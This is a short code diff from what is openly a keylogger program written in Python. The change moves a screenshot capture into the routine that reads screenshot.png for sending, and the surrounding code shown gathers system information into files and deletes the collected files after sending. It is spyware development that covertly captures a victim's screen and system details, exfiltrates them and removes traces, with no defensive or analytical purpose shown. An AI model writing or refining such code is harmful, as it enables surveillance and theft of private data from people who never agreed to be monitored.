@@ -56,7 +56,7 @@ extend="\\keylogger\\"
 def screenshot():
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
-screenshot()
+
 
 def computer_information():
     with open(file_path+extend+system_information,"a") as f:
@@ -217,6 +217,7 @@ def send_log():
     os.remove(file_path+ '\\keylogger'+'\\systeminfo.txt') #deletes files
 
 def send_img():
+    screenshot()
     with open(file_path+ '\\keylogger'+'\\screenshot.png', 'rb') as f4:
         file_data=f4.read() 
         file_name=f4.name
